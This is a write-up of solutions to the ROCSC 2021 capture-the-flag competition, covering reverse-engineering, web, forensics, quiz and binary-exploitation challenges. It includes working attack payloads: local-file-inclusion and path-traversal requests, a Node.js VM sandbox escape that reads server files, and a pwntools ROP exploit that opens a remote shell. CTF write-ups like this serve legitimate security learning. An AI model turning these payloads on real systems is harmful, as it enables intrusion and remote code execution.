# Writeups for ROCSC 2021 - shad

The challenges are going to be presented in order.

## el-picasso - Reverse Engineering

### Flag

`ctf{1ff757b6b99229db80a208563aa98dfb5e4a592b34551ba44b63038c7bd442af}`

### Description

A binary that prints a pusheen.

### Solution

I loaded the binary in my favourite decompiler and I looked at the functions. It looked like it was painting a 100x100 matrix. My logic was that labels with code were going to be a coloured pixel, labels without code would be RGB (0,0,0). I wrote a simple script that painted and the result was a QR code which I was able to scan with my iPhone 12 Pro Max to get the flag.

### Exploit

```py
from PIL import Image, ImageDraw

data = open("e_picasso").readlines()
data_split = []

last_diff = 0

mmap = {}

for line in data:
space_split = line.split(" ")
space_split = [x for x in space_split if len(x) > 2]
#print(space_split)
addr = int(space_split[1], 16)
name = space_split[-1].strip()

    #print(addr,name)
    data_split.append([addr, name, 1 if (addr - last_diff) > 16 else 0])
    i, j = int(name.split("e_")[1].split("_")[0].strip()), int(name.split("_")[-1].strip())
    #print(name, i, j)

    mmap[(i,j)] = 1 if (addr - last_diff) > 16 else 0
    #print(addr, name, last_diff, addr - last_diff)
    last_diff = addr

#print(data_split)

im = Image.new(mode="RGB", size=(100,100))

for i in range(100):
for j in range(100):
if(mmap[(i,j)] == 1):
im.putpixel((i, j), (255, 0, 0))

im.show()
```

## ultra-crawl - Web

### Flag

`ctf{d8b7e522b0ab04101e78ab1c6ff68c4cb2f30ce9d4427d4cd77bc19238367933}`

### Description

Local File Inclusion with a bit of overhead.

### Solution

Find the LFI. Use it to read /home/ctf/app.py via `url=file:///home/ctf/app.py` (we discover the user `ctf` from `/etc/passwd`, also, the same user has been used multiple times).
The flag is only shown for those who issue GET requests via the HTTP `Host: company.tld` header.

## where-do-you-go - Misc

### Flag

`ctf{83ac8f43b6dc92217de38ce84b5b3bb4e067642dfbf76a35dcf03cbb1508b956}`

### Description

The challenge sends multiple CVE descriptions and we are tasked to match them with the CVE id.

### Solution

Python binary that loads the entire Mitre CVE database and answers for each question with the found CVE id. Very error-prone due to formatting, CVE numbers and unicode.

### Exploit

```py
from pwn import *
#import google
import re
#from googlesearch import search
import pandas

context.log_level = "DEBUG"

#p = remote("34.107.45.139", 32403)

cves_pd = pandas.read_csv("./allitems.csv", encoding="ISO-8859-1",
                          engine="python", names=["id", "status",
                                                  "description", "references",
                                                  "phase", "votes", "comments"])

#print(cves_pd)
#print(cves_pd["id"])
#print(cves_pd["description"])

#print(cves_pd["id"].find("CVE-2020-9700"))

#for index, row in cves_pd.iterrows():
#    print(row["id"], row["description"])

p = remote("34.107.45.139", 32403)

def get_cve(query):
    global cves_pd
    pattern = r"&(&#[xX][0-9a-fA-F]+|#\d+|[lg]t|amp|apos|quot);"

    for index, row in cves_pd.iterrows():
        newrow = row["description"]
        newrow = re.sub(pattern, "", newrow)
        if query in newrow:
            return row["id"]

    #cve_pattern = 'CVE-\d{4}-\d{4,7}'
    #print(cves_pd)

while True:
    question = p.recvline().decode('utf-8')
    if "What do you think:" in question and len(question) < 30:
        continue

    if "What do you think:" in question:
        question = question.split("What do you think:")[1]

    question = question.strip()
    print(question)

    results = get_cve(question)
    print("SENDING", results)

    p.sendline(results)
```

## speed - Reverse Engineering

### Flag

`CTF{0f68f60833e9872b4c58e421be66edc696584de1a573e6b985965ea2eafc46c8}`

### Description

A reverse engineering challenge in which we have to find out the correct value for passing the checks, then we have to hash it and provide it as a flag.

### Solution

As the binary does not actually take any parameters (even though it deceives us to think it does), we need to calculate it statically.

### Exploit

```c
#include <stdio.h>
#include <stdlib.h>


int main()
{
    srand(4548);
    int a = rand();
    printf("%d\n", a);
    return 0;
}
```

```py
import ctypes
from pwn import *
import struct
import sys

context.terminal = ["tmux", "splitw", "-h"]

my_functions = ctypes.CDLL(ctypes.util.find_library("c"))

my_functions.srand(4548)

lhs = my_functions.rand() ^ 0x539

rhs = my_functions.rand()

input = lhs ^ rhs

input_hex = hex(input)[2:]

print(input_hex, input)

p = gdb.debug(args=["./speed", str(input)], gdbscript='''
br main''')
p.interactive()
```

## reccon - Web

### Flag

`CTF{486cdfe3a59141aca752fb10b44c70facca9c5b1d7be444aa840d14148030e66} `

### Description

Arguably a web challenge.

### Solution

Open a browser with the BurpSuite Pro proxy, right click on the domain with the right scanners, click Guess Everything! (guesses headers, GET url parameters, etc.). Find secret URL get parameters that say "try harder". CTRL + I to send to intruder and fuzz.

### Exploit

`http://34.141.59.125:32391/index.php?m=1`

## Little-endian-photo - Forensics

### Flag

`ctf{112687d319c48cc38709a90b34d6df10904711b93a74b27f73d9382ff64053a0}`

### Description

Given a seemingly broken image, retrieve the flag.

### Solution

Figure out from the data layout that the file is a valid BMP, replace the starting header to obtain a picture of a hacker. Running `zsteg -v -a` informs us that there are 90k-something bytes not covered in the IHDR header. Manually edit (with a hex editor) the image sizes to include the rest of the image. The flag is shown in the top right-hand corner.

## file-crawler - Web

### Flag

`CTF{0caec419d3ad1e1f052f06bae84d9106b77d166aae899c6dbe1355d10a4ba854}`

### Description

Another web LFI challenge which involves finding the vulnerable URI.
From the url `http://35.246.178.49:30603/local?image_name=static/path.jpg` we can assume that the image_name GET parameter is vulnerable.

### Solution

Use `35.246.178.49:30603/local?image_name=./app.py` to leak the source code and find that back traversal is attempted to be fixed by `image_name = request.args.get('image_name').replace("../","").replace(".../","")`.
The final payload involves navigating to the root and getting the flag.
Luckily for us, any mitigations against back traversal are thwarted by the fact that we can just get the flag from root.

### Exploit

`http://35.246.178.49:30603/local?image_name=/tmp/flag`

## Calculus - Web

### Flag

`CTF{de71c185bcc37c8b169f7bb4c1c0bd3c7fe041110ae4d176434d396c2de52121}`

### Description

Find the API endpoints and escape the NodeJS VM jail to use require("fs") and read the flag. (Aribtrary code execution, could probably exploit the K8 network, didn't have time for it)

### Solution

Craft a specific payload to allow us to import `require` and import `fs` to leak the source code.

### Exploit

```http
GET /sum?a=1,1);result=this.constructor.constructor(%27return%20this.process.mainModule.require%27)()(%22fs%22).readFileSync(%22/home/ctf/server.js%22).toString()//&b=1 HTTP/1.1
Host: 34.141.31.183:30641
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Response:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 3093
ETag: W/"c15-c0Dr+3MTASHV4WmYadxhB/CakcA"
Date: Sat, 28 Aug 2021 17:22:32 GMT
Connection: close

{"result":"'use strict';\n\nconst express = require('express');\n\n// FLAG = CTF{de71c185bcc37c8b169f7bb4c1c0bd3c7fe041110ae4d176434d396c2de52121}\n\n// Constants\nconst PORT = 1234;\nconst HOST = '0.0.0.0';\n\n// App\nconst app = express();\n\n\napp.get('/', (req, res) => {\n    app.use(express.static(\"public\"));\n    res.sendFile('/home/ctf/index.html');\n    \n});\n\n\napp.get('/multiply', (req, res) => {\n    if(req.query.a == null || req.query.b == null ){\n        res.status(200);\n        res.json({\n            result: (\"Missing a,b!!\")\n        });\n        return;\n    }\n    res.setHeader(\"Content-Type\", \"application/json\");\n    res.status(200);\n    res.json({\n        result: (req.query.a * req.query.b)\n    });\n});\napp.get('/sqrt', (req, res) => {\n    if(req.query.a == null || req.query.b == null ){\n        res.status(200);\n        res.json({\n            result: (\"Missing a,b!!\")\n        });\n        return;\n    }\n    res.setHeader(\"Content-Type\", \"application/json\");\n    res.status(200);\n    res.json({\n        result: (Math.sqrt(req.query.a))\n    });\n});\n\napp.get('/mod', (req, res) => {\n    if(req.query.a == null || req.query.b == null ){\n        res.status(200);\n        res.json({\n            result: (\"Missing a,b!!\")\n        });\n        return;\n    }\n    res.setHeader(\"Content-Type\", \"application/json\");\n    res.status(200);\n    res.json({\n        result: (req.query.a % req.query.b)\n    });\n});\n\napp.get('/div', (req, res) => {\n    if(req.query.a == null || req.query.b == null ){\n        res.status(200);\n        res.json({\n            result: (\"Missing a,b!!\")\n        });\n        return;\n    }\n    res.setHeader(\"Content-Type\", \"application/json\");\n    res.status(200);\n    res.json({\n        result: (req.query.a / req.query.b)\n    });\n\n});\n\napp.get('/sum', (req, res) => {\n    const vm = require(\"vm\");\n    // exit remove\n    if(req.query.a == null || req.query.b == null ){\n        res.status(200);\n        res.json({\n            result: (\"Missing a,b!!\")\n        });\n        return;\n    }\n    console.log(req.query.a);\n    \n    var result = 0, code = \"var add = function(a,b){return a + b;}; result = add(\"+req.query.a+\",two);\";\n   \n    if( req.query.a.includes(\"exit()\")){\n        res.status(200);\n        res.json({\n            result: (\"You Bastard!\")\n    });\n    }\n    else if (req.query.a.includes(\".execSync(\")){\n        res.status(200);\n        res.json({\n            result: (\"You Better Try Harder Than This!\")\n    });\n    }\n    else{\n        try {\n            result = vm.runInNewContext(code,{two:req.query.b,result:result});\n        } catch(e) {\n            res.status(500);\n            res.json({\n             msg: e.toString(),\n             stack: e.stack\n            }); \n            \n            return;\n        }\n        \n    }\n   \n    res.status(200);\n    res.json({\n        result: (result)\n        });\n    });\n\napp.listen(PORT, HOST);\nconsole.log(`Running on http://${HOST}:${PORT}`);\n"}
```

## clueless_investigation - Reverse Engineering

### Flag

`ctf{d780919c7289a18ebf2125488b90b6315afa1796c465bf48912dd627b5593e66}`

### Description

Reverse Engineering tasks which has us recover the flag from an encoded output.

### Solution

Decompile the source code with a good decompiler, use it as code, find that the functions used to encode the text are cyclic based on the length of the payload, run them multiple times to uncover the flag without having to actually reverse engineer any of the encoding steps.

### Exploit

```cpp
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctype.h>

static void printArray(const char *str, int len)
{
  //for(int i = 0; i < len; ++i) printf("%02x", *str++);
  //puts("\n");
  printf("%s\n", str);
}

static bool compArray(const char* a1, const char* a2, size_t len) {
  for(size_t i = 0; i < len; ++i) {
    if(a1[i] != a2[i]) {
      return false;
    }
  }
  return true;
}

char byte_202040[128] = {};
char byte_2020C0[1024] = {};
char byte_2024C0[104] = {};

// undo v2
void func1(char* msg)
{
  char* result; // rax
  int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = *(unsigned char *)(i + msg);
    if ( !(char)result )
      break;
    if ( *(char *)(i + msg) == '_' )
      *(char *)(i + msg) = 'x';
  }
  return result;
}

void func2(char* a1)
{
  int v2; // [rsp+18h] [rbp-538h]
  int i; // [rsp+18h] [rbp-538h]
  int v4; // [rsp+18h] [rbp-538h]
  int j; // [rsp+18h] [rbp-538h]
  int k; // [rsp+18h] [rbp-538h]
  int l; // [rsp+18h] [rbp-538h]
  int m; // [rsp+18h] [rbp-538h]
  int v9; // [rsp+1Ch] [rbp-534h]
  int v10; // [rsp+1Ch] [rbp-534h]
  int v11[100]; // [rsp+20h] [rbp-530h]
  int v12[100]; // [rsp+1B0h] [rbp-3A0h]
  int v13[100]; // [rsp+340h] [rbp-210h]
  char v14[36]; // [rsp+4D0h] [rbp-80h]

  v2 = 0;
  v9 = 0;
  while ( v2 < strlen(a1) )
  {
    if ( a1[v2] != ' ' )
      a1[v9++] = toupper(a1[v2]);
    ++v2;
  }
  a1[v9] = 0;
  for ( i = 0; i < strlen(a1); ++i )
    v11[i] = a1[i] - 'A';
  strcpy(v14, "abcdefghijklmnopqrstuvwxyzasdfgasdfee");
  v4 = 0;
  v10 = 0;
  while ( v4 < strlen(v14) )
  {
    if ( v14[v4] != 32 )
      v14[v10++] = toupper(v14[v4]);
    ++v4;
  }
  v14[v10] = 0;
  for ( j = 0; j < strlen(v14); ++j )
    v12[j] = v14[j] - 65;
  for ( k = 0; k < strlen(a1); ++k )
    v13[k] = v12[k] + v11[k];
  for ( l = 0; l < strlen(a1); ++l )
  {
    if ( v13[l] > 25 )
      v13[l] -= 26;
  }
  for ( m = 0; m < strlen(a1); ++m )
    byte_202040[m] = (v13[m] & 0xff) + 'A';
}

void invert_func2(char* a1) {
  memcpy(byte_202040, a1, 104);
  for(int i = 0; i < 24; ++i) {
    func2(byte_202040);
  }
}

void func3(char* a1) {
  signed int i; // [rsp+18h] [rbp-61AA8h]
  signed int l; // [rsp+18h] [rbp-61AA8h]
  signed int k; // [rsp+18h] [rbp-61AA8h]
  signed int m; // [rsp+18h] [rbp-61AA8h]
  int j; // [rsp+1Ch] [rbp-61AA4h]
  int v7; // [rsp+1Ch] [rbp-61AA4h]
  int n; // [rsp+1Ch] [rbp-61AA4h]
  char v9; // [rsp+20h] [rbp-61AA0h]
  int v10; // [rsp+24h] [rbp-61A9Ch]
  int v11; // [rsp+28h] [rbp-61A98h]
  int v12[100002]; // [rsp+30h] [rbp-61A90h]

  v11 = strlen(a1);
  for ( i = 0; i < 5; ++i )
  {
    for ( j = 0; j < v11; ++j )
      v12[1000LL * i + j] = 0;
  }
  v9 = 0;
  v7 = 0;
  while ( v7 < v11 )
  {
    if ( v9 & 1 )
    {
      for ( k = 3; k > 0; --k )
      {
        v12[1000LL * k + v7] = a1[v7];
        ++v7;
      }
    }
    else
    {
      for ( l = 0; l < 5; ++l )
      {
        v12[1000LL * l + v7] = a1[v7];
        ++v7;
      }
    }
    ++v9;
  }
  v10 = 0;
  for ( m = 0; m < 5; ++m )
  {
    for ( n = 0; n < v11; ++n )
    {
     // printf("%c ", v12[1000LL * m + n]);
      if ( v12[1000LL * m + n] )
        byte_2020C0[v10++] = v12[1000LL * m + n];
    }
    //printf("\n");
  }
}

char* func4(char* a1)
{
  char* result; // rax
  int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = *(unsigned char *)(i + a1);
    if ( !(char)result )
      break;
    if ( (*(char *)(i + a1) < 0 || *(char *)(i + a1) > '@')
      && (*(char *)(i + a1) <= 'Z' || *(char *)(i + a1) > '`')
      && *(char *)(i + a1) <= 'z' )
    {
      if ( *(char *)(i + a1) > '@' && *(char *)(i + a1) <= 'Z' )
        byte_2024C0[i] = 0x9B - *(char *)(i + a1);
      if ( *(char *)(i + a1) > '`' && *(char *)(i + a1) <= 'z' )
        byte_2024C0[i] = 0xDB - *(char *)(i + a1);
    }
    if ( *(char *)(i + a1) >= 0 && *(char *)(i + a1) <= '@'
      || *(char *)(i + a1) > 'Z' && *(char *)(i + a1) <= '`'
      || *(char *)(i + a1) > 'z' )
    {
      byte_2024C0[i] = *(char *)(i + a1);
    }
  }
  return result;
}

char iv4[1024] = {};

char* invert_func4(char* a1, size_t len)
{
  memcpy(iv4, a1, len);
  for(size_t i = 0; i < len; ++i) {
    if(iv4[i] >= 'A' && iv4[i] <= 'Z' ) {
      iv4[i] = 'Z' - (iv4[i] - 'A');
    } else if(iv4[i] >= 'a' && iv4[i] <= 'z') {
      iv4[i] = 'z' - (iv4[i] - 'a');
    }
  }

  return iv4;
}

char iv3[1024] = {};

void invert_func3(char* a1, size_t lens) {
  memcpy(byte_2020C0, a1, 1024);
  for(size_t i = 0; i < 29; ++i) {
    func3(byte_2020C0);
  }
}

void func5(char* a1)
{
  int i; // [rsp+1Ch] [rbp-514h]
  unsigned char* v3; // [rsp+528h] [rbp-8h]

  for ( i = 0; *(char *)(i + a1); ++i )
  {
    if ( *(char *)(i + a1) != 32 && (unsigned int)(*(char *)(i + a1) - '0') > 9 )
      continue;
    if ( *(char *)(i + a1) == 32 )
      continue;
    if ( (unsigned int)(*(char *)(i + a1) - '0') <= 9 && *(char *)(i + a1) != 32 )
      continue;
  }
}

int main(int argc, char** argv, char** envp)
{
  char v5[0x100] = {};
  char v6[0x100] = {};

  FILE* stream = fopen(argv[1], "r");
  fscanf(stream, "%[^\n]", v5);

  memcpy(v6, v5, 0x100);

  /*func1(v5);
  func2(v5);
  func3(byte_202040);
  func4(byte_2020C0);

  invert_func4(byte_2024C0, 104);
  func5(byte_2024C0);

  printArray(v5, 0x100);
  printArray(byte_202040, 128);
  printArray(byte_2020C0, 1024);
  printArray(byte_2024C0, 104);

  printf("INVERT\n\n");
  printArray(v5, 104);*/

  /*
  size_t i = 0;

  while(true) {
    func2(byte_202040);
    if(compArray(v6, byte_202040, 104)) {
      printf("ALELUJAH %d\n", i);
      break;
    }

    ++i;
  }*/

  //invert_func3(iv4, 104);
  //printArray(iv3, 104);

  /*char buuf[1024] = {};
  memcpy(buuf, byte_2020C0, 1024);
  size_t i = 0;

   while(true) {
    func3(byte_2020C0);
    if(compArray(byte_2020C0, buuf, 1024)) {
      printf("ALELUJAH %d\n", i);
      break;
    }

    ++i;
  }*/


  /*printf("FUNC 4\n");
  invert_func4(byte_2024C0, 104);

  printf("FUNC 3\n");
  invert_func3(iv4, 1024);
  printArray(byte_2020C0, 1024);

  printf("FUNC 2\n");
  memcpy(byte_202040, byte_2020C0, 104);
  printArray(byte_202040, 1024);
  for(size_t i = 0; i < 25; ++i) func2(byte_202040);
  printArray(byte_202040, 1024);*/


  printArray(v5, 104);
  invert_func4(v5, 104);

  invert_func3(iv4, 1024);
  printArray(byte_2020C0, 1024);

  printf("FUNC 2\n");
  memcpy(byte_202040, byte_2020C0, 104);
  printArray(byte_202040, 1024);
  for(size_t i = 0; i < 25; ++i) func2(byte_202040);
  printArray(byte_202040, 1024);
  return 0;
}
```

## inodat - Web

### Flag

`CTF{11a0aafa059bda95fdb80332309eb6368ddf4e572dadbe0c40dfe0be69bf515d}`

### Description

The challenge involves finding nested APIs to exploit and retrieve the flag.

### Solution

Using BurpSuite and gobuster, we can rapidly uncover the /api/v1/<> paths. From then on, finding the vulnerability is trivial but we need to escape the encodings.

### Exploit

```http
http://34.107.45.139:31092/api/v1/math?sum=require(%22fs%22)[%22readF%22%2B%22ile%22%2B%22Sync%22](Buffer.from(%22Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v%22%2b%22Li4vaG9tZS9jdGYvc2VjcmV0X2ZsYWdfZm9sZGVyX2Fkc2FzZG9oaS9mbGFnLnR4dA==%22,%20%22base%22%2B%2264%22))
```

## old-tickets - Web

### Flag

`ctf{4086d9012b250dc1d821340f23b4af9b29d780552434175cb713b6d7502885c9}`

### Description

A web challenge which has us find an HTML comment to retrieve old tickets, without knowing the API.

### Solution

Using the displayed debugger for Flask, we can uncover bits of the source code by forcing errors in the 3 HTTP methods handled by the index route: PUT, POST and GET.
With this information, we can now find the flag using the POST route (makes complete sense right? RESTful...).
Find the timestamp for the comment after learning that it's just MD5(timestamp), go to intruder, Payload Options, Start: timestamp, Step: 1, Payload Processing: MD5, Success.

## n4twork urg3nt investigation - Quiz

### Flag

```
pikalang
networkminer
10.20.230.192
www.pizzahut.ro
```

### Description

Quiz.

### Solution

Decode the requirements, figure the 4 questions we need to address. We don't even need the PCAP (a bit of a lie, we need it to find the pizzahut.ro flag via the DNS query for the last question)

## what-to-do - Quiz

### Flag

```
scareware
maltego
apktool
libc
cheatengine
germany
w3af
worm
hashing
pcidss
vishing
binwalk
tcpdump
caesar
pwntools
waf
databreach
entropy
spearphishing
insufficient
informationleakage
indirect
including
inclusion
insecure
insufficient
```

### Description

Quiz.

### Solution

Answer the questions by googling.

### can-you-jump - Pwn

### Flag

`CTF{70dd83585c9e2656c8a391b7dbc1f28e8d40a98067fdb56adfb69b8e509481df}`

### Description

Very trivial introductory Buffer Overflow with an already existing leak for printf. Just ROP to `pop rdi` and `system("/bin/sh");`

### Solution

Find the crash address with pwntools `cyclic`. `ropper -f can-you-jump | grep pop` to find pop rop gadgets. Exploit.

### Exploit

```py
from pwn import *
from binascii import unhexlify
context.terminal = ["tmux", "splitw", "-h"]

REMOTE = True
DEBUGGING = True

if REMOTE:
    p = remote('34.141.31.183', 32584)
else:
    if DEBUGGING:
        p = gdb.debug(["./can-you-jump"])
    else:
        p = process(["./can-you-jump"])


p.recvuntil(b"Printf() address : ")
addr = int(p.recvuntil("\n").strip()[2:].decode('utf-8'), 16)

print(hex(addr))

printf_offset = 0x64f70
one_gadget = 0x4f432
system = 0x4f550

# pop rdi
pop_rdi = 0x400773

# pop rsi, pop sth
pop_rsi = 0x400771

# ret gadget
ret_gadget = 0x400291

# bin/sh
binsh = 0x1b3e1a

# system
system = 0x4f550

libc_base = addr - printf_offset
print('LIBC LEAK', hex(libc_base))

payload = b""
payload += p64(pop_rdi)
payload += p64(libc_base + binsh)

payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(0x0)

payload += p64(libc_base + system)

p.sendline(cyclic_find('saaa') * b'\x00'  + payload)
p.interactive()
```
